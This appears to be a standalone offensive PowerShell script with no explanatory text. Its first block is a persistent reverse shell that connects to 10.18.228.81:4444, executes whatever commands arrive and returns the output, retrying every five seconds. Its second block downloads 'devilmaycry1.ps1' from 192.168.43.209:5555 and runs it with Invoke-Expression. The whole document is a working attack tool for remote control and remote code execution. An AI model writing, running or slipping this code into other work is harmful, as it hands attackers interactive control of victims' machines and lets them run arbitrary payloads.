while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("10.18.228.81", 4444)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | % { 0 }
        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = [System.Text.ASCIIEncoding]::ASCII.GetString($bytes, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String)
            $prompt = "PS " + (pwd).Path + "> "
            $sendback2 = $sendback + $prompt
            $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 5
    }
}



$remoteURL = 'http://192.168.43.209:5555/devilmaycry1.ps1'
$webResponse = Invoke-WebRequest -Uri $remoteURL -UseBasicParsing
$remoteCode = [System.Text.Encoding]::UTF8.GetString($webResponse.Content)
Invoke-Expression -Command $remoteCode
